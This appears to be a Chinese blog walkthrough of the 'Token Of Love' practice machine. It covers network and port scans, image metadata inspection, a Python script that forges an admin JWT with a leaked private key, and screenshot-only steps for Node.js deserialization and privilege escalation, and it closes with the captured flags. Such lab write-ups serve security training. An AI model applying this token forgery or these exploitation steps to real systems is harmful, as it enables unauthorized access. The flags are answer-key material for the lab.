---
title: thehackerslabs Token Of Love靶机复盘
author: LingMj
data: 2025-02-20
categories: [thehackerslabs]
tags: [jwt,webp,stego,rsync,nodejs,tee]
description: 难度-Hard
---

## 网段扫描
```
root@LingMj:/home/lingmj/xxoo# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.56.110
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:13       (Unknown: locally administered)
192.168.56.100  08:00:27:35:d4:9c       PCS Systemtechnik GmbH
192.168.56.157  08:00:27:63:f9:ac       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.329 seconds (109.92 hosts/sec). 3 responded
```

## 端口扫描

```
root@LingMj:/home/lingmj/xxoo# nmap -p- -sC -sV 192.168.56.157
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 03:09 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.157
Host is up (0.0033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 f2:13:45:97:52:82:db:77:a3:8c:7c:24:36:51:e2:c9 (ECDSA)
|_  256 4b:3e:f2:d3:c4:f6:be:cd:04:ff:f1:a1:1f:a5:63:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Token Of Love - Inicia Sesi\xC3\xB3n
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:63:F9:AC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.35 seconds
```

## 获取webshell
![图 0](../assets/images/56e458d50a30ccb3c5e8c5acb817d91d034cf01d6f4ae1d305a1eb4110591b26.png)  
![图 1](../assets/images/4f7d5abd76c57f278a11e780fa4fb31d46212d0b4ee3722688eb1e30ef3c5d21.png)  

>存在域名，可以进行一下
>

![图 2](../assets/images/7aa0f462094c3c2db39db7ce99f47db82ac28e3640bbf6498f200cfcefc83b99.png)  

```
root@LingMj:/home/lingmj/xxoo# exiftool hacker.webp                         
ExifTool Version Number         : 12.76
File Name                       : hacker.webp
Directory                       : .
File Size                       : 308 kB
File Modification Date/Time     : 2025:02:15 16:39:14-05:00
File Access Date/Time           : 2025:02:20 03:13:25-05:00
File Inode Change Date/Time     : 2025:02:20 03:13:25-05:00
File Permissions                : -rw-r--r--
File Type                       : WEBP
File Type Extension             : webp
MIME Type                       : image/webp
VP8 Version                     : 0 (bicubic reconstruction, normal loop)
Image Width                     : 1024
Horizontal Scale                : 0
Image Height                    : 1024
Vertical Scale                  : 0
JUMD Type                       : (c2pa)-0011-0010-800000aa00389b71
JUMD Label                      : c2pa
Actions Action                  : c2pa.created, c2pa.converted
Actions Software Agent          : DALL·E
Actions Digital Source Type     : http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia
Exclusions Start                : 209368
Exclusions Length               : 14876
Name                            : jumbf manifest
Alg                             : sha256
Hash                            : (Binary data 32 bytes, use -b option to extract)
Pad                             : (Binary data 8 bytes, use -b option to extract)
Title                           : image.webp
Format                          : webp
Instance ID                     : xmp:iid:201326b7-d604-4842-b2ec-1c82e5b2c38b
Claim generator                 : OpenAI-API c2pa-rs/0.31.3
Claim generator info            : null
Signature                       : self#jumbf=c2pa.signature
Assertions Url                  : self#jumbf=c2pa.assertions/c2pa.actions, self#jumbf=c2pa.assertions/c2pa.hash.data
Assertions Hash                 : (Binary data 32 bytes, use -b option to extract), (Binary data 32 bytes, use -b option to extract)
Item 0                          : (Binary data 1985 bytes, use -b option to extract)
Item 1 Sig Tst Tst Tokens Val   : (Binary data 5945 bytes, use -b option to extract)
Item 1 Pad                      : (Binary data 5773 bytes, use -b option to extract)
Item 2                          : null
Item 3                          : (Binary data 64 bytes, use -b option to extract)
C2PA Thumbnail Ingredient Jpeg Type: image/jpeg
C2PA Thumbnail Ingredient Jpeg Data: (Binary data 68617 bytes, use -b option to extract)
C2 Pa Manifest Url              : self#jumbf=/c2pa/urn:uuid:41b85a3d-a8f1-471e-b65c-799f24721dc2
C2 Pa Manifest Alg              : sha256
C2 Pa Manifest Hash             : (Binary data 32 bytes, use -b option to extract)
Relationship                    : parentOf
Thumbnail URL                   : self#jumbf=c2pa.assertions/c2pa.thumbnail.ingredient.jpeg
Thumbnail Hash                  : (Binary data 32 bytes, use -b option to extract)
Image Size                      : 1024x1024
Megapixels                      : 1.0
                                                                                                                                                                                                                                                        
root@LingMj:/home/lingmj/xxoo# strings -n 13 hacker.webp                         
urn:uuid:41b85a3d-a8f1-471e-b65c-799f24721dc2
c2pa.assertions
factionlc2pa.createdmsoftwareAgentgDALL
EqdigitalSourceTypexFhttp://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia
factionnc2pa.converted
c2pa.hash.data
dnamenjumbf manifestcalgfsha256dhashX 
hdc:titlejimage.webpidc:formatdwebpjinstanceIDx,xmp:iid:201326b7-d604-4842-b2ec-1c82e5b2c38boclaim_generatorx
OpenAI-API c2pa-rs/0.31.3tclaim_generator_info
self#jumbf=c2pa.signaturejassertions
curlx'self#jumbf=c2pa.assertions/c2pa.actionsdhashX <
curlx)self#jumbf=c2pa.assertions/c2pa.hash.datadhashX 
c2pa.signature
WebClaimSigningCA1
250113203843Z
260113203842Z0V1
Truepic Lens CLI in DALL
1http://va.truepic.com/ejbca/publicweb/status/ocsp0
211209203946Z
261208203945Z0J1
WebClaimSigningCA1
20250213033929Z
DigiCert, Inc.1;09
2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA0
240926000000Z
351125235959Z0B1
DigiCert Timestamp 20240
Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0
http://ocsp.digicert.com0X
Lhttp://cacerts.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crt0
DigiCert Inc1
www.digicert.com1!0
DigiCert Trusted Root G40
220323000000Z
370322235959Z0c1
DigiCert, Inc.1;09
2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA0
http://ocsp.digicert.com0A
5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C
2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 
DigiCert Inc1
www.digicert.com1$0"
DigiCert Assured ID Root CA0
220801000000Z
311109235959Z0b1
DigiCert Inc1
www.digicert.com1!0
DigiCert Trusted Root G40
http://ocsp.digicert.com0C
7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E
4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0
DigiCert, Inc.1;09
2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA
250213033929Z0+
urn:uuid:1a47ebc7-669f-4b2b-84b3-0218baf0638a
c2pa.assertions
c2pa.thumbnail.ingredient.jpeg
((((((((((((((((((((((((((((((((((((((((((((((((((
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
c2pa.ingredient
hdc:titlejimage.webpidc:formatdWEBPjinstanceIDx,xmp:iid:22f4d925-cf87-4511-b3cf-ee1f637f5990mc2pa_manifest
curlx>self#jumbf=/c2pa/urn:uuid:41b85a3d-a8f1-471e-b65c-799f24721dc2calgfsha256dhashX B
?lrelationshiphparentOfithumbnail
curlx9self#jumbf=c2pa.assertions/c2pa.thumbnail.ingredient.jpegdhashX 
c2pa.hash.data
dnamenjumbf manifestcalgfsha256dhashX X
hdc:titlejimage.webpidc:formatdwebpjinstanceIDx,xmp:iid:04f7c9d5-51a4-478c-86c2-329174a65aa2oclaim_generatorvChatGPT c2pa-rs/0.31.3tclaim_generator_info
self#jumbf=c2pa.signaturejassertions
curlx9self#jumbf=c2pa.assertions/c2pa.thumbnail.ingredient.jpegdhashX 
curlx*self#jumbf=c2pa.assertions/c2pa.ingredientdhashX x
curlx)self#jumbf=c2pa.assertions/c2pa.hash.datadhashX <
3_calgfsha256
c2pa.signature
WebClaimSigningCA1
250113203646Z
260113203645Z0V1
Truepic Lens CLI in ChatGPT0Y0
1http://va.truepic.com/ejbca/publicweb/status/ocsp0
211209203946Z
261208203945Z0J1
WebClaimSigningCA1
20250213033929Z
DigiCert, Inc.1;09
2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA0
240926000000Z
351125235959Z0B1
DigiCert Timestamp 20240
Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0
http://ocsp.digicert.com0X
Lhttp://cacerts.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crt0
DigiCert Inc1
www.digicert.com1!0
DigiCert Trusted Root G40
220323000000Z
370322235959Z0c1
DigiCert, Inc.1;09
2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA0
http://ocsp.digicert.com0A
5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C
2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 
DigiCert Inc1
www.digicert.com1$0"
DigiCert Assured ID Root CA0
220801000000Z
311109235959Z0b1
DigiCert Inc1
www.digicert.com1!0
DigiCert Trusted Root G40
http://ocsp.digicert.com0C
7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E
4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0
DigiCert, Inc.1;09
2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA
250213033929Z0+
                                                                                                                                                                                                                                                        
root@LingMj:/home/lingmj/xxoo# stegseek hacker.webp                                     
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file "hacker.webp" is not supported.
```

![图 3](../assets/images/1a5be1fc75b2a75e6c98a0607a0f7c7256b3987a3463903122ee4c0a996491bd.png)  
![图 4](../assets/images/1a4fba8e770c19bca9c1784aa80fe54c977d2c4a0da6292ef7c11028fac49178.png)  

>好像需要先登录才能进行，尝试爆破
>

![图 5](../assets/images/ae0969aced2817ca390729903b4cfcdf0d7a7ca8446db45f24e639b067fd5631.png)  

>注册一下就行了，看看表达了啥
>

![图 6](../assets/images/ec83867f3cc7aec8006fadf3c7f872e6e05ea154c203fff208faaf82c68545a7.png)  
![图 7](../assets/images/d9c4e25afa3c9043e87a4024b4369ae2da5132d719ef44f2e644bcfeadbf406b.png)  
![图 8](../assets/images/61ae2f6f01a5fce359751432eca4b2ae90b8171c7eaae5b98071deee5f7a384d.png)  
![图 9](../assets/images/80a559d2f16f16a522ecd481f20490248bed24e6caddeabe8a1e5fdf94c01560.png)  
![图 11](../assets/images/834b25bdf53b8f95c576740ad9394d8aac1c8aa88983700c471743c235db6bd1.png)  
![图 12](../assets/images/8e3472af91196103f26ac4b52669c921a1852b41e740fd6c67de30891aa7b5fe.png)  

>开始到我的知识盲区了
>

![图 13](../assets/images/10f1ac4e9ebf2d710cdcce680544ed0b11e9a373bf36c15895ec435fb830fe00.png)  

>这里是发送信息的格式，但是我想是不是要登录administrador才能发送呢，现在思考的是如何找到administrador的密码
>

![图 14](../assets/images/9e106edfef5cf8fa7b2c00813e250305b4de62346b2e2165dda6cf67ddc9004f.png)  

>这里很懵逼，我建议我看看别的大佬开荒时的提示，我有点琢磨不透
>

![图 15](../assets/images/590b5fedb82be557be0eeceeb2386da17028e437d936eacb65616887621544aa.png)  
![图 16](../assets/images/40f2b91517292b107f89ea1aa8f0e45db8571a07ff95ef921a1be86d0bbd2a70.png)  
![图 17](../assets/images/b8b55bc1388ea7b4d909cfef6da0376066f5035d9cfcc2f3187e894cea00596d.png)  

>大小很有区别，进行群主的操作
>

![图 18](../assets/images/9bc3adaa8e0a48f174df07062a4b492e76057d49c7073b9329b86cd5a4ca3501.png)  

>要密码的，开始有点不知所措了，密码为空，白想几分钟
>
![图 20](../assets/images/ac05f25052a8a5cb6b00a73db8cf0ed8ac626832ae0af9d9514f8c90ed3e55b1.png)  

![图 19](../assets/images/fce21057b58aa80a8b03b98cf7ba2ee99ee1326989bd3783449de09212d3152b.png)  

![图 21](../assets/images/24491bff90777f1ae816cebde001e768a1d99a4aff36057d1b050754ea4319a4.png)  

>没有说明用户，没有密码，现在思考是回去找一下登录admin还是爆破ssh，但是感觉爆破ssh不太现实
>

![图 22](../assets/images/f46f02dd2fe06da8e21ddae5b637477315ab553392e05ba8a197def9c235d91c.png)  

>这里夹带私货，才发现
>

![图 23](../assets/images/f4aa55d9434069e276f0651c46027bca5552688a769848f431a74b02203d0a74.png)  
![图 24](../assets/images/d8c19783b12cecf053a4eb885ae1e5a5088d3a4a932bc672c616437f84d34af0.png)  


```
import jwt
import json
from datetime import datetime, timedelta

# JWT 的头部信息
header = {
    "alg": "RS256",
    "typ": "JWT"
}

# JWT 的载荷（Payload）
payload = {
    "id": 2,
    "username": "admin",
    "role": "user",
    "iat": int(datetime.now().timestamp()),  # 当前时间戳
    "exp": int((datetime.now() + timedelta(hours=1)).timestamp())  # 1小时后过期
}

# 读取私钥文件
def load_private_key(file_path):
    try:
        with open(file_path, "r") as key_file:
            private_key = key_file.read()
        return private_key
    except FileNotFoundError:
        print(f"Error: File not found at {file_path}")
        return None
    except Exception as e:
        print(f"Error loading private key: {e}")
        return None

# 生成 JWT
def generate_jwt(payload, private_key):
    try:
        token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
        return token
    except Exception as e:
        print(f"Error generating JWT: {e}")
        return None

# 主函数
def main():
    private_key_path = "/home/lingmj/xxoo/key/private.key"  # 确保路径正确
    private_key = load_private_key(private_key_path)
    
    if private_key:
        token = generate_jwt(payload, private_key)
        if token:
            print("Generated JWT:")
            print(token)
        else:
            print("Failed to generate JWT.")
    else:
        print("Failed to load private key.")

if __name__ == "__main__":
    main()
```

>有兴趣的拿去跑一下，当然这只是我懒的方案
>token：eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQwMDQzNjQ5LCJleHAiOjE3NDAwNDcyNDl9.iTMQPDkgG2LATlDcP0fcS9gLprfiYJPVRcpjeV7MNOKZ9W9jnMHFw3V8m7GVFWUZwuyGRjJ6fG-G_NnB8JrR_Ut4JLUDBlOapziQCYAYnzBqwHGN4bFkP7YKZypxlpqgwe9XSUpMOVHVCifP-fg01JM0hODODaBlX-RliWVII45S0kCVBAZI68NJJGZkF21Psi_xXyTYIwNOQUJGdiA1ZdJD-Tp3poT1dqRhcY33EbimCrr5wdvJyEgEQ1VuSY7fglldFmr1BExMg7ZlzbGOt8ImGrDV3aJnlfNJJzIBv_-sWe6nfXI1g6-Xnm7SU20MUm88GQuWTsBnEXcd5ProeA
>


![图 25](../assets/images/d78775a1190700284e44fea5c1732651727af0457875ce6708014d1d31c6d0fe.png)  

>没见加上去应该是我的问题,跑一下bamuwe大佬的脚本
>

![图 26](../assets/images/2c0426df25f48fbe4351618c40a15300738fb9f4db90f93aec040d8f26904b5b.png)  

![图 27](../assets/images/a337f5ecda76231ec73215f9429cfa5863f17e3ada9fccb7bce4a5b77c4bd86c.png)  

>确实是这样的，但是我咋登录进去成了问题
>

![图 28](../assets/images/28421b544a9767ec34fceb7658fddb954b2502d458f1b8920622cc97270a4fe4.png)  

>头疼，没成功时间搓的问题么
>

![图 29](../assets/images/b26e7519992a2bb6ed09b3a577e3f98e105e07f5da64af0ccb4fa41e9235c68f.png)  

>改了没成功很烦啊
>

![图 30](../assets/images/a44b48270866bce08b4bc01d562c3167e4b25330808e1b6bf301c8ab5c7611fc.png)  

>还是认证没过
>

![图 31](../assets/images/6c2cf4205af2885281d8e301c9da4f68bf38b3330d316a74b9eab2149b9ea034.png)  
![图 32](../assets/images/d8a2998eeef7ecd21918f5256104006415fb560b64af7d6b5fe09876c146cbc0.png)  
![图 33](../assets/images/43cc0e374244198bfab0b0e60e88141dcaeee91fa4451400b377fbe4004bda57.png)  


>手动吧
>

![图 34](../assets/images/f427060183ff9088b6275b609af8ee5159e90426c4eadd0fa6b001e5bf6cb42f.png)  

>还是没过是什么问题
>

![图 35](../assets/images/5cc57942b773098f5c0ff8eb8e7b838c207b208e50ed6479c70e7eb99cb932aa.png)  

>靠明白了没给role我一直是user所以没过
>
![图 36](../assets/images/a1c84ee890553ba5ad8d8d1516cee872dcfbec7b205cf0f5b207dce3b633c878.png)  
![图 37](../assets/images/6c1a943815f986710ae98dbf0c0050f9a865a1eaa3aa63965122a76e05003459.png)  

>到这里还是用burp吧，有点难弄了
>

![图 38](../assets/images/026ee4c4af940bec1753bac78b909c47c63727f895391a850b1602633a91f494.png)  

>假如他是模板的话message应该怎么进行命令注入呢
>
![图 39](../assets/images/20277857de1a4410289f3647e0f301fb5f630af94d69a0c50b2eecb3934775e1.png)  

>看了一下那个文档：https://book.hacktricks.wiki/zh/pentesting-web/deserialization/index.html#nodejs 没看懂好像是我没明白怎么构造的问题
>

![图 40](../assets/images/35a35d9860d8b05375a9a6603b85fd63c8ec205f747b5f1d80b4129c5bc07788.png)  

>这个地址可能有线索：https://github.com/swisskyrepo/PayloadsAllTheThings/blob/7e64eda3bfeccf8820f5dafc99afd05e5e420ae1/Insecure%20Deserialization/Node.md
>

![图 41](../assets/images/e1b00a6ac92fdb9b10cedf0956a7af27040bb1003edb965e6861beaeb2e7f828.png)  

>看来不是直接利用，再研究一下
>
![图 42](../assets/images/234f216465cb47478a47b54559e27ca3d566784fd8bc138af026d2006c251bb3.png)  
![图 43](../assets/images/b08e21da466ed0394bbfdb0121524d05d6948048a9ec432977cd04411109f7b2.png)  

>算了直接找提示的poc了，不会用密钥过期了？
>
![图 44](../assets/images/55c1f10a194ffd9e230b840edc2bd6a0503600323d90c127a8c74d565a30ec6b.png)  

>我已经开始怀疑是我构造的token问题了
>

![图 45](../assets/images/166ee7c2a1f22f16d32391b82dc101a0d60e07e4b1aa9dce3b9142bfa8581276.png)  

>果然是token的问题好了可以继续下一步了
>

![图 46](../assets/images/87fb83112518e1c111b4998a65b306dfdc3f2c5f45eaab810e99586ed1378d78.png)  

![图 47](../assets/images/167dfc382a69cdac31337266724800a9fc3ac4fa30aa9a26ec2fb1109f643f0a.png)  

>成功那可以看出没啥需要改的，虽然不是我找到的方案
>

![图 48](../assets/images/782fcd332eb28156a2bdf7e4317a396dab16abd719765bfeeb7d471b5ccfd300.png)  



## 提权
![图 49](../assets/images/f226853128130c1293ac5de39b48e7fa74088455cf989a98e7f1fe4d596bbf4b.png)
![图 51](../assets/images/bbe16c3cf129a144246d7df7b8fdfdd122af58760653d5276fc9212876a03f43.png)  

![图 50](../assets/images/ac405e07e8b654b1efadd01b52df1fd81470d055f09308028070aa57083a3e06.png)  

>单纯读文件么？可是好像没啥可读的除非藏密码啥的，而且也不确定是这条路目前
>

![图 52](../assets/images/37e9aacbe864c6f2869d70ba6f84ced6c0d015f91c0b699bced28d792f84cdd9.png)  
![图 53](../assets/images/046d259d9c13db19a1366a5037d7daadd5d21f26bc1a489d98151b5624a0bdf2.png)  

>感觉像是烟雾弹或者是毒话，哈哈哈哈
>

![图 54](../assets/images/5d08c701edcd1f9001e47bf61aaa3d285d72c4da81e2329da18bb81281d50142.png)  

>再看看别出，不然用工具了
>

![图 55](../assets/images/8bf1b34559b7de3144a11d9bece79d8dd6ab8af393de14fd131ff36026de5f76.png)  

>有个3000,但是看这个样子好像是我们刚刚登录的
>
![图 56](../assets/images/f31e8db7706fa1b8326fed82a39182540d552dd3363e6473a563fc0f22706ef8.png)  

>无直接进行工具了，工具无获，看扒拉聊天记录去了，很懵逼
>

![图 57](../assets/images/7bdaac98ab8f9109f5f987462bccf74221de59d435ee0de7db7de31f07f68c9d.png)  
![图 58](../assets/images/ec09e98a99f75b9ab61a90c67741014a0ec74e7c536c0715cf95f40e9bf32fd4.png)  

>细看还是有东西的，但是目前看大佬聊天记录测试没有啥直接利用方案
>

![图 59](../assets/images/8964732fa17c82e339fec966b25893da0a1f50c3a471cad1d7a51554f857cadf.png)  

>群主大佬找的方案：https://www.exploit-db.com/papers/33930
>

![图 60](../assets/images/3e7b26c67582d8b60e38fc2021262e6b9bb83094baf9b179cc896e87b9858694.png)  

>真是方案喂嘴里都不知道咋构造，受不了了
>
![图 63](../assets/images/33cd9d9ba2a619b6a71fe769fab27c42dadd5b40d6ac2411b2723f106ed177bd.png)  

![图 62](../assets/images/381456ffc02ae5a93c07f40ec7c7fbb8e3914c0dd2b6b1349ebca46b494b773f.png)  

![图 61](../assets/images/9600e78c0cfb9a7b802f938a3cdb68962319027114cdb417cec815072cece7b7.png)  

![图 64](../assets/images/e5f70a7adb04ed1917c51ff0736aac29566522498e20bf1413b02ea7cd754e1a.png)  

>好了结束，是一个非常充实的靶机
>

>userflag:2032f531b474172175d02465b0a4941c
>
>rootflag:e0772277e3cdf59b65c6b76df5b84ea6
>